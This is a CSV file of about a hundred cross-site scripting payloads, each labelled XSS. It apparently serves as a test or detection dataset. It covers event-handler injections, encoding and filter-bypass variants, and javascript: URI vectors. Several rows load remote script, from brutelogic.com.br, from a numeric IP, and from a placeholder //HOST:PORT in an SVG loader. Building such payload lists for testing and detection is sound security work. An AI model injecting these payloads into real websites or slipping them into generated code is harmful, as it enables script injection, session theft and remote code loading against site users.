payload,attack
"""-prompt(8)-""",XSS
-prompt(8)-',XSS
""";a=prompt,a()//",XSS
";a=prompt,a()//",XSS
"-eval(""window['pro'%2B'mpt'](8)"")-'",XSS
"""-eval(""window['pro'%2B'mpt'](8)"")-""",XSS
"""onclick=prompt(8)>""@x.y",XSS
"""onclick=prompt(8)><svg/onload=prompt(8)>""@x.y",XSS
<image/src/onerror=prompt(8)>,XSS
<img/src/onerror=prompt(8)>,XSS
<image src/onerror=prompt(8)>,XSS
<img src/onerror=prompt(8)>,XSS
<image src =q onerror=prompt(8)>,XSS
<img src =q onerror=prompt(8)>,XSS
</scrip</script>t><img src =q onerror=prompt(8)>,XSS
<svg onload=alert(1)>,XSS
"""><svg onload=alert(1)//",XSS
"""onmouseover=alert(1)//",XSS
"""autofocus/onfocus=alert(1)//",XSS
-alert(1)-',XSS
-alert(1)//,XSS
\'-alert(1)//,XSS
</script><svg onload=alert(1)>,XSS
<x contenteditable onblur=alert(1)>lose focus! ,XSS
<x onclick=alert(1)>click this! ,XSS
<x oncopy=alert(1)>copy this! ,XSS
<x oncontextmenu=alert(1)>right click this! ,XSS
<x oncut=alert(1)>copy this! ,XSS
<x ondblclick=alert(1)>double click this! ,XSS
<x ondrag=alert(1)>drag this! ,XSS
<x contenteditable onfocus=alert(1)>focus this! ,XSS
<x contenteditable oninput=alert(1)>input here! ,XSS
<x contenteditable onkeydown=alert(1)>press any key! ,XSS
<x contenteditable onkeypress=alert(1)>press any key! ,XSS
<x contenteditable onkeyup=alert(1)>press any key! ,XSS
<x onmousedown=alert(1)>click this! ,XSS
<x onmousemove=alert(1)>hover this! ,XSS
<x onmouseout=alert(1)>hover this! ,XSS
<x onmouseover=alert(1)>hover this! ,XSS
<x onmouseup=alert(1)>click this! ,XSS
<x contenteditable onpaste=alert(1)>paste here!,XSS
<script>alert(1)// ,XSS
<script>alert(1)<!–,XSS
<script src=//brutelogic.com.br/1.js> ,XSS
<script src=//3334957647/1>,XSS
%3Cx onxxx=alert(1) ,XSS
<%78 onxxx=1 ,XSS
<x %6Fnxxx=1 ,XSS
<x o%6Exxx=1 ,XSS
<x on%78xx=1 ,XSS
<x onxxx%3D1,XSS
<X onxxx=1 ,XSS
<x OnXxx=1 ,XSS
<X OnXxx=1 ,XSS
<x onxxx=1 onxxx=1,XSS
<x/onxxx=1 ,XSS
<x%09onxxx=1 ,XSS
<x%0Aonxxx=1 ,XSS
<x%0Conxxx=1 ,XSS
<x%0Donxxx=1 ,XSS
<x%2Fonxxx=1 ,XSS
<x 1='1'onxxx=1 ,XSS
"<x 1=""1""onxxx=1",XSS
<x </onxxx=1 ,XSS
"<x 1="">"" onxxx=1 ",XSS
<http://onxxx%3D1/,XSS
<x onxxx=alert(1) 1=',XSS
"<svg onload=setInterval(function(){with(document)body.appendChild(createElement('script')).src='//HOST:PORT'},0)>",XSS
onload=alert(1)><svg/1=',XSS
>alert(1)</script><script/1=' ,XSS
*/alert(1)</script><script>/*,XSS
"*/alert(1)"">'onload=""/*<svg/1='",XSS
"`-alert(1)"">'onload=""`<svg/1='",XSS
*/</script>'>alert(1)/*<script/1=',XSS
<script>alert(1)</script> ,XSS
<script src=javascript:alert(1)> ,XSS
<iframe src=javascript:alert(1)> ,XSS
<embed src=javascript:alert(1)> ,XSS
<a href=javascript:alert(1)>click ,XSS
<math><brute href=javascript:alert(1)>click ,XSS
<form action=javascript:alert(1)><input type=submit> ,XSS
<isindex action=javascript:alert(1) type=submit value=click> ,XSS
<form><button formaction=javascript:alert(1)>click ,XSS
<form><input formaction=javascript:alert(1) type=submit value=click> ,XSS
<form><input formaction=javascript:alert(1) type=image value=click> ,XSS
<form><input formaction=javascript:alert(1) type=image src=SOURCE> ,XSS
<isindex formaction=javascript:alert(1) type=submit value=click> ,XSS
<object data=javascript:alert(1)> ,XSS
<iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;> ,XSS
"<svg><script xlink:href=data:,alert(1) /> ",XSS
<math><brute xlink:href=javascript:alert(1)>click ,XSS
<svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=?><circle r=400 /><animate attributeName=xlink:href begin=0 from=javascript:alert(1) to=&>,XSS
